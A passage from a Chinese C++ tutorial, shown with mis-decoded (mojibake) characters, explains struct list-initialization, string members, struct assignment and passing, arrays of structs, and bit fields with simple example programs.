æˆå‘˜å¹¶èµ‹å€¼ã€‚</li></ul><h3 id="4-4-2-C-11ç»“æ„åˆå§‹åŒ–"><a href="#4-4-2-C-11ç»“æ„åˆå§‹åŒ–" class="headerlink" title="4.4.2 C++11ç»“æ„åˆå§‹åŒ–"></a>4.4.2 C++11ç»“æ„åˆå§‹åŒ–</h3><p>C++11 å¼•å…¥çš„åˆ—è¡¨åˆå§‹åŒ–ï¼ˆèŠ±æ‹¬å·åˆå§‹åŒ–ï¼‰ä¹Ÿé€‚ç”¨äºç»“æ„ä½“ï¼Œæä¾›äº†æ›´çµæ´»ã€æ›´å®‰å…¨çš„åˆå§‹åŒ–æ–¹å¼ã€‚</p><p><strong>ç‰¹ç‚¹:</strong></p><ol><li> <strong>å¯ä»¥çœç•¥ç­‰å· <code>=</code>:</strong> ä¸æ•°ç»„ç±»ä¼¼ï¼Œå¯ä»¥åœ¨åˆå§‹åŒ–æ—¶çœç•¥ç­‰å·ã€‚</li><li> <strong>å¯ä»¥æŒ‰æˆå‘˜é¡ºåºåˆå§‹åŒ–:</strong> <code>StructType var &#123;value1, value2, ...&#125;;</code></li><li> <strong>å¯ä»¥åˆå§‹åŒ–éƒ¨åˆ†æˆå‘˜ (C++20 designated initializers):</strong> C++20 å…è®¸é€šè¿‡æŒ‡å®šæˆå‘˜åè¿›è¡Œåˆå§‹åŒ–ï¼Œå¯ä»¥ä¸æŒ‰é¡ºåºæˆ–åªåˆå§‹åŒ–éƒ¨åˆ†æˆå‘˜ã€‚ä½†åœ¨ C++11/14/17 ä¸­ï¼Œé€šå¸¸éœ€è¦æŒ‰é¡ºåºæä¾›å€¼ã€‚</li><li> <strong>ç©ºèŠ±æ‹¬å·åˆå§‹åŒ–:</strong> <code>StructType var &#123;&#125;;</code> ä¼šå°†æ‰€æœ‰æˆå‘˜è¿›è¡Œ<strong>é›¶åˆå§‹åŒ–</strong>ï¼ˆæ•°å€¼ç±»å‹ä¸º0ï¼ŒæŒ‡é’ˆä¸º <code>nullptr</code>ï¼Œ<code>bool</code> ä¸º <code>false</code>ï¼Œç±»ç±»å‹ä¼šè°ƒç”¨é»˜è®¤æ„é€ å‡½æ•°ï¼‰ã€‚</li><li> <strong>ç¦æ­¢ç¼©çª„è½¬æ¢:</strong> ä¸æ•°ç»„ä¸€æ ·ï¼Œåˆ—è¡¨åˆå§‹åŒ–ä¸å…è®¸å¯èƒ½ä¸¢å¤±ä¿¡æ¯çš„ç¼©çª„è½¬æ¢ã€‚</li></ol><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Product</span> &#123;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> id;</span><br><span class="line">    <span class="keyword">int</span> quantity;</span><br><span class="line">    <span class="keyword">double</span> price;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// C++11 åˆ—è¡¨åˆå§‹åŒ– (çœç•¥ç­‰å·)</span></span><br><span class="line">    Product item1 &#123; <span class="string">&quot;A123&quot;</span>, <span class="number">50</span>, <span class="number">19.95</span> &#125;; <span class="comment">// æŒ‰é¡ºåºåˆå§‹åŒ–æ‰€æœ‰æˆå‘˜</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// çœç•¥ç­‰å·ï¼Œéƒ¨åˆ†åˆå§‹åŒ– (C++11/14/17 ä¸­ï¼Œæœªæä¾›çš„æˆå‘˜ä¼šè¢«å€¼åˆå§‹åŒ–/é›¶åˆå§‹åŒ–)</span></span><br><span class="line">    <span class="comment">// æ³¨æ„ï¼šè¿™ç§éƒ¨åˆ†åˆå§‹åŒ–å¯¹äºåŒ…å« std::string ç­‰ç±»ç±»å‹æˆå‘˜æ—¶ï¼Œè¡Œä¸ºä¾èµ–äºè¿™äº›ç±»çš„é»˜è®¤æ„é€ å‡½æ•°</span></span><br><span class="line">    <span class="comment">// Product item2 &#123; &quot;B456&quot;, 100 &#125;; // price ä¼šè¢«é›¶åˆå§‹åŒ–ä¸º 0.0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç©ºèŠ±æ‹¬å·è¿›è¡Œé›¶åˆå§‹åŒ–</span></span><br><span class="line">    Product item3 &#123;&#125;; <span class="comment">// id ä¸ºç©ºå­—ç¬¦ä¸², quantity ä¸º 0, price ä¸º 0.0</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Item 1 ID: &quot;</span> &lt;&lt; item1.id &lt;&lt; <span class="string">&quot;, Qty: &quot;</span> &lt;&lt; item1.quantity &lt;&lt; <span class="string">&quot;, Price: &quot;</span> &lt;&lt; item1.price &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; &quot;Item 2 ID: &quot; &lt;&lt; item2.id &lt;&lt; &quot;, Qty: &quot; &lt;&lt; item2.quantity &lt;&lt; &quot;, Price: &quot; &lt;&lt; item2.price &lt;&lt; std::endl;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Item 3 ID: \&quot;&quot;</span> &lt;&lt; item3.id &lt;&lt; <span class="string">&quot;\&quot;, Qty: &quot;</span> &lt;&lt; item3.quantity &lt;&lt; <span class="string">&quot;, Price: &quot;</span> &lt;&lt; item3.price &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç¦æ­¢ç¼©çª„è½¬æ¢</span></span><br><span class="line">    <span class="comment">// Product item_error &#123; &quot;C789&quot;, 10.5, 25.0 &#125;; // é”™è¯¯! 10.5 (double) åˆ° int æ˜¯ç¼©çª„è½¬æ¢</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// C++20 Designated Initializers (å¦‚æœç¼–è¯‘å™¨æ”¯æŒ C++20)</span></span><br><span class="line">    <span class="comment">// Product item4 &#123; .id = &quot;D001&quot;, .price = 99.99 &#125;; // quantity ä¼šè¢«é›¶åˆå§‹åŒ–</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; &quot;Item 4 ID: &quot; &lt;&lt; item4.id &lt;&lt; &quot;, Qty: &quot; &lt;&lt; item4.quantity &lt;&lt; &quot;, Price: &quot; &lt;&lt; item4.price &lt;&lt; std::endl;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-4-3-ç»“æ„å¯ä»¥å°†stringç±»ä½œä¸ºæˆå‘˜å—"><a href="#4-4-3-ç»“æ„å¯ä»¥å°†stringç±»ä½œä¸ºæˆå‘˜å—" class="headerlink" title="4.4.3 ç»“æ„å¯ä»¥å°†stringç±»ä½œä¸ºæˆå‘˜å—"></a>4.4.3 ç»“æ„å¯ä»¥å°†stringç±»ä½œä¸ºæˆå‘˜å—</h3><p><strong>æ˜¯çš„ï¼Œç»å¯¹å¯ä»¥ã€‚</strong> æ­£å¦‚åœ¨ <code>4.4.1</code> å’Œ <code>4.4.2</code> çš„ç¤ºä¾‹ä¸­çœ‹åˆ°çš„ (<code>Inflatable</code> å’Œ <code>Product</code> ç»“æ„)ï¼Œ<code>std::string</code> å¯¹è±¡å¯ä»¥åƒ <code>int</code>ã€<code>double</code> æˆ–å…¶ä»–ä»»ä½•ç±»å‹ä¸€æ ·ä½œä¸ºç»“æ„çš„æˆå‘˜ã€‚</p><p>è¿™ä½¿å¾—ç»“æ„èƒ½å¤Ÿæ–¹ä¾¿åœ°åŒ…å«æ–‡æœ¬ä¿¡æ¯ï¼Œå¹¶åˆ©ç”¨ <code>string</code> ç±»æä¾›çš„æ‰€æœ‰åŠŸèƒ½ï¼ˆè‡ªåŠ¨å†…å­˜ç®¡ç†ã€æ‹¼æ¥ã€æŸ¥æ‰¾ç­‰ï¼‰ã€‚</p><p><strong>ç¤ºä¾‹å›é¡¾:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Student</span> &#123;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> name; <span class="comment">// string æˆå‘˜</span></span><br><span class="line">    <span class="keyword">int</span> studentID;</span><br><span class="line">    <span class="keyword">double</span> gpa;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Student s1 &#123; <span class="string">&quot;Alice Wonderland&quot;</span>, <span class="number">12345</span>, <span class="number">3.8</span> &#125;;</span><br><span class="line">    Student s2;</span><br><span class="line">    s2.name = <span class="string">&quot;Bob The Builder&quot;</span>; <span class="comment">// å¯ä»¥åƒæ™®é€š string ä¸€æ ·æ“ä½œ</span></span><br><span class="line">    s2.studentID = <span class="number">67890</span>;</span><br><span class="line">    s2.gpa = <span class="number">3.5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; s1.name &lt;&lt; <span class="string">&quot; has GPA: &quot;</span> &lt;&lt; s1.gpa &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; s2.name &lt;&lt; <span class="string">&quot; has ID: &quot;</span> &lt;&lt; s2.studentID &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-4-4-å…¶ä»–ç»“æ„å±æ€§"><a href="#4-4-4-å…¶ä»–ç»“æ„å±æ€§" class="headerlink" title="4.4.4 å…¶ä»–ç»“æ„å±æ€§"></a>4.4.4 å…¶ä»–ç»“æ„å±æ€§</h3><p>ç»“æ„åœ¨ C++ ä¸­å…·æœ‰ä¸€äº›æ–¹ä¾¿çš„å±æ€§ï¼š</p><ol><li><strong>èµ‹å€¼ (Assignment):</strong> å¯ä»¥ä½¿ç”¨èµ‹å€¼è¿ç®—ç¬¦ <code>=</code> å°†ä¸€ä¸ªç»“æ„å˜é‡çš„å€¼èµ‹ç»™åŒç±»å‹çš„å¦ä¸€ä¸ªç»“æ„å˜é‡ã€‚è¿™ä¼šæ‰§è¡Œ**æˆå‘˜é€ä¸€å¤åˆ¶ (memberwise copy)**ï¼Œå³å°†æºç»“æ„æ¯ä¸ªæˆå‘˜çš„å€¼å¤åˆ¶åˆ°ç›®æ ‡ç»“æ„å¯¹åº”æˆå‘˜ä¸­ã€‚ <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Student s1 = &#123;<span class="string">&quot;Charlie&quot;</span>, <span class="number">111</span>, <span class="number">3.9</span>&#125;;</span><br><span class="line">Student s2;</span><br><span class="line">s2 = s1; <span class="comment">// s2 çš„ name, studentID, gpa éƒ½è¢«è®¾ç½®ä¸º s1 çš„å€¼</span></span><br></pre></td></tr></table></figure></li><li><strong>ä½œä¸ºå‡½æ•°å‚æ•° (Pass by Value):</strong> å¯ä»¥å°†ç»“æ„å˜é‡æŒ‰å€¼ä¼ é€’ç»™å‡½æ•°ã€‚å‡½æ•°ä¼šæ”¶åˆ°ç»“æ„çš„ä¸€ä¸ªå‰¯æœ¬ï¼Œå¯¹å‰¯æœ¬æˆå‘˜çš„ä¿®æ”¹ä¸ä¼šå½±å“åŸå§‹ç»“æ„å˜é‡ã€‚ <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">displayStudent</span><span class="params">(Student s)</span> </span>&#123; <span class="comment">// s æ˜¯ä¼ å…¥ç»“æ„çš„ä¸€ä¸ªå‰¯æœ¬</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ID: &quot;</span> &lt;&lt; s.studentID &lt;&lt; <span class="string">&quot;, Name: &quot;</span> &lt;&lt; s.name &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    s.name = <span class="string">&quot;Changed&quot;</span>; <span class="comment">// åªä¿®æ”¹å‰¯æœ¬</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">displayStudent(s1); <span class="comment">// ä¼ é€’ s1 çš„å‰¯æœ¬</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; s1.name; <span class="comment">// è¾“å‡º &quot;Charlie&quot;ï¼Œæœªè¢«æ”¹å˜</span></span><br></pre></td></tr></table></figure></li><li><strong>ä½œä¸ºå‡½æ•°å‚æ•° (Pass by Reference/Pointer):</strong> ä¸ºäº†é¿å…å¤åˆ¶æ•´ä¸ªç»“æ„çš„å¼€é”€ï¼Œæˆ–è€…éœ€è¦åœ¨å‡½æ•°ä¸­ä¿®æ”¹åŸå§‹ç»“æ„ï¼Œé€šå¸¸æŒ‰å¼•ç”¨æˆ–æŒ‡é’ˆä¼ é€’ç»“æ„ã€‚ <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">updateGPA</span><span class="params">(Student&amp; s, <span class="keyword">double</span> newGPA)</span> </span>&#123; <span class="comment">// æŒ‰å¼•ç”¨ä¼ é€’ï¼Œå¯ä»¥ä¿®æ”¹åŸå§‹ç»“æ„</span></span><br><span class="line">    s.gpa = newGPA;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printID</span><span class="params">(<span class="keyword">const</span> Student* sPtr)</span> </span>&#123; <span class="comment">// æŒ‰æŒ‡é’ˆä¼ é€’ (const é˜²æ­¢æ„å¤–ä¿®æ”¹)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ID: &quot;</span> &lt;&lt; sPtr-&gt;studentID &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// ä½¿ç”¨ -&gt; è®¿é—®æŒ‡é’ˆæŒ‡å‘çš„ç»“æ„æˆå‘˜</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">updateGPA(s1, <span class="number">4.0</span>); <span class="comment">// ä¿®æ”¹åŸå§‹ s1</span></span><br><span class="line">printID(&amp;s1);       <span class="comment">// ä¼ é€’ s1 çš„åœ°å€</span></span><br></pre></td></tr></table></figure></li><li><strong>ä½œä¸ºå‡½æ•°è¿”å›å€¼:</strong> å‡½æ•°å¯ä»¥è¿”å›ä¸€ä¸ªç»“æ„ã€‚ <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Student <span class="title">createStudent</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span> name, <span class="keyword">int</span> id, <span class="keyword">double</span> gpa)</span> </span>&#123;</span><br><span class="line">    Student temp;</span><br><span class="line">    temp.name = name;</span><br><span class="line">    temp.studentID = id;</span><br><span class="line">    temp.gpa = gpa;</span><br><span class="line">    <span class="keyword">return</span> temp; <span class="comment">// è¿”å›ä¸€ä¸ª Student ç»“æ„</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">Student s3 = createStudent(<span class="string">&quot;David&quot;</span>, <span class="number">222</span>, <span class="number">3.7</span>); </span><br></pre></td></tr></table></figure></li></ol><p>è¿™äº›ç‰¹æ€§ä½¿å¾—ç»“æ„æˆä¸ºç»„ç»‡å’Œä¼ é€’ç›¸å…³æ•°æ®çš„å¼ºå¤§å·¥å…·ã€‚</p><h3 id="4-4-5-ç»“æ„æ•°ç»„"><a href="#4-4-5-ç»“æ„æ•°ç»„" class="headerlink" title="4.4.5 ç»“æ„æ•°ç»„"></a>4.4.5 ç»“æ„æ•°ç»„</h3><p>å¯ä»¥åˆ›å»º**ç»“æ„æ•°ç»„ (Array of Structures)**ï¼Œå³æ•°ç»„çš„æ¯ä¸ªå…ƒç´ éƒ½æ˜¯ä¸€ä¸ªç»“æ„å˜é‡ã€‚è¿™å¯¹äºå¤„ç†ä¸€ç»„å…·æœ‰ç›¸åŒç»“æ„çš„æ•°æ®éå¸¸æœ‰ç”¨ï¼Œä¾‹å¦‚ä¸€ä¸ªç­çº§çš„å­¦ç”Ÿä¿¡æ¯ã€ä¸€ä¸ªå•†åº—çš„åº“å­˜åˆ—è¡¨ç­‰ã€‚</p><p><strong>å£°æ˜å’Œåˆå§‹åŒ–:</strong></p><p>å£°æ˜ç»“æ„æ•°ç»„ä¸å£°æ˜æ™®é€šæ•°ç»„ç±»ä¼¼ï¼Œåªæ˜¯å…ƒç´ ç±»å‹æ˜¯ç»“æ„ç±»å‹ã€‚åˆå§‹åŒ–å¯ä»¥ä½¿ç”¨åµŒå¥—çš„èŠ±æ‹¬å·ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Student</span> &#123;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> name;</span><br><span class="line">    <span class="keyword">int</span> studentID;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> CLASS_SIZE = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// å£°æ˜ä¸€ä¸ªåŒ…å« CLASS_SIZE ä¸ª Student ç»“æ„çš„æ•°ç»„</span></span><br><span class="line">    Student classRoster[CLASS_SIZE]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆå§‹åŒ–ç»“æ„æ•°ç»„ (ä½¿ç”¨åµŒå¥—èŠ±æ‹¬å·)</span></span><br><span class="line">    Student graduates[<span class="number">2</span>] = &#123;</span><br><span class="line">        &#123;<span class="string">&quot;Alice&quot;</span>, <span class="number">101</span>&#125;, <span class="comment">// åˆå§‹åŒ– graduates[0]</span></span><br><span class="line">        &#123;<span class="string">&quot;Bob&quot;</span>, <span class="number">102</span>&#125;    <span class="comment">// åˆå§‹åŒ– graduates[1]</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// C++11 åˆ—è¡¨åˆå§‹åŒ–</span></span><br><span class="line">    Student freshmen[CLASS_SIZE] &#123;</span><br><span class="line">        &#123;<span class="string">&quot;Charlie&quot;</span>, <span class="number">201</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;David&quot;</span>, <span class="number">202</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;Eve&quot;</span>, <span class="number">203</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®¿é—®ç»“æ„æ•°ç»„ä¸­çš„å…ƒç´ åŠå…¶æˆå‘˜</span></span><br><span class="line">    classRoster[<span class="number">0</span>].name = <span class="string">&quot;Frank&quot;</span>;</span><br><span class="line">    classRoster[<span class="number">0</span>].studentID = <span class="number">301</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Graduate 1: &quot;</span> &lt;&lt; graduates[<span class="number">0</span>].name &lt;&lt; <span class="string">&quot; (ID: &quot;</span> &lt;&lt; graduates[<span class="number">0</span>].studentID &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Freshman 3 ID: &quot;</span> &lt;&lt; freshmen[<span class="number">2</span>].studentID &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Roster 1 Name: &quot;</span> &lt;&lt; classRoster[<span class="number">0</span>].name &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// éå†ç»“æ„æ•°ç»„</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nFreshmen List:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; CLASS_SIZE; ++i) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; - &quot;</span> &lt;&lt; freshmen[i].name &lt;&lt; <span class="string">&quot; (ID: &quot;</span> &lt;&lt; freshmen[i].studentID &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <code>Student classRoster[CLASS_SIZE];</code>: å£°æ˜äº†ä¸€ä¸ªæ•°ç»„ï¼Œæ¯ä¸ªå…ƒç´ éƒ½æ˜¯ <code>Student</code> ç»“æ„ã€‚</li><li>  <code>graduates[0] = &#123;&quot;Alice&quot;, 101&#125;;</code>: åˆå§‹åŒ–æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼ˆä¸€ä¸ª <code>Student</code> ç»“æ„ï¼‰ã€‚</li><li>  <code>freshmen[i].name</code>: è®¿é—®æ•°ç»„ <code>freshmen</code> ä¸­ç´¢å¼•ä¸º <code>i</code> çš„å…ƒç´ çš„ <code>name</code> æˆå‘˜ã€‚</li></ul><h3 id="4-4-6-ç»“æ„ä¸­çš„ä½å­—æ®µ"><a href="#4-4-6-ç»“æ„ä¸­çš„ä½å­—æ®µ" class="headerlink" title="4.4.6 ç»“æ„ä¸­çš„ä½å­—æ®µ"></a>4.4.6 ç»“æ„ä¸­çš„ä½å­—æ®µ</h3><p><strong>ä½å­—æ®µ (Bit Field)</strong> æ˜¯ä¸€ç§ç‰¹æ®Šçš„ç»“æ„æˆå‘˜ï¼Œå®ƒå…è®¸ä½ æŒ‡å®šæˆå‘˜å˜é‡å ç”¨çš„**ä½æ•° (bits)**ã€‚è¿™ä¸»è¦ç”¨äºéœ€è¦ç²¾ç¡®æ§åˆ¶å†…å­˜å¸ƒå±€æˆ–ä¸ç¡¬ä»¶å¯„å­˜å™¨äº¤äº’çš„åœºæ™¯ã€‚</p><p><strong>è¯­æ³•:</strong></p><p>åœ¨ç»“æ„å®šä¹‰ä¸­ï¼Œæˆå‘˜ååé¢è·Ÿä¸€ä¸ªå†’å· <code>:</code> å’Œä¸€ä¸ªæ•´æ•°å¸¸é‡ï¼Œè¡¨ç¤ºè¯¥æˆå‘˜å ç”¨çš„ä½æ•°ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">RegisterFlags</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> readEnable : <span class="number">1</span>; <span class="comment">// å ç”¨ 1 ä½</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> writeEnable : <span class="number">1</span>; <span class="comment">// å ç”¨ 1 ä½</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> mode : <span class="number">2</span>;       <span class="comment">// å ç”¨ 2 ä½</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> reserved : <span class="number">4</span>;   <span class="comment">// å ç”¨ 4 ä½ (é€šå¸¸ç”¨äºå¡«å……æˆ–å¯¹é½)</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>ç‰¹ç‚¹å’Œæ³¨æ„äº‹é¡¹:</strong></p><ul><li>  <strong>ç±»å‹:</strong> ä½å­—æ®µçš„ç±»å‹é€šå¸¸æ˜¯ <code>unsigned int</code> æˆ– <code>signed int</code>ï¼ˆæˆ– <code>int</code>ï¼Œå…¶ç¬¦å·æ€§å–å†³äºå®ç°ï¼‰ï¼Œä¹Ÿå¯ä»¥æ˜¯ <code>bool</code> (C++11ï¼Œç­‰æ•ˆäº <code>: 1</code>)ã€‚</li><li>  <strong>å†…å­˜èŠ‚çœ:</strong> å½“å¤šä¸ªæ ‡å¿—æˆ–å°èŒƒå›´æ•°å€¼éœ€è¦å­˜å‚¨æ—¶ï¼Œä½å­—æ®µå¯ä»¥æ˜¾è‘—èŠ‚çœå†…å­˜ï¼Œå°†å®ƒä»¬æ‰“åŒ…åˆ°å•ä¸ªæ•´æ•°æˆ–å‡ ä¸ªå­—èŠ‚ä¸­ã€‚</li><li>  <strong>ç¡¬ä»¶æ¥å£:</strong> å¸¸ç”¨äºæ˜ å°„ç¡¬ä»¶è®¾å¤‡å¯„å­˜å™¨çš„ç‰¹å®šä½ã€‚</li><li>  <strong>è®¿é—®:</strong> åƒæ™®é€šç»“æ„æˆå‘˜ä¸€æ ·ä½¿ç”¨ç‚¹è¿ç®—ç¬¦è®¿é—®ï¼Œä½†ä¸èƒ½è·å–ä½å­—æ®µçš„åœ°å€ï¼ˆ<code>&amp;</code> è¿ç®—ç¬¦ä¸èƒ½ç”¨äºä½å­—æ®µï¼‰ã€‚</li><li>  <strong>å¯ç§»æ¤æ€§:</strong> ä½å­—æ®µçš„å†…å­˜å¸ƒå±€ï¼ˆä½çš„æ’åˆ—é¡ºåºã€è·¨å­—èŠ‚è¾¹ç•Œçš„å¤„ç†ï¼‰å¯èƒ½å› 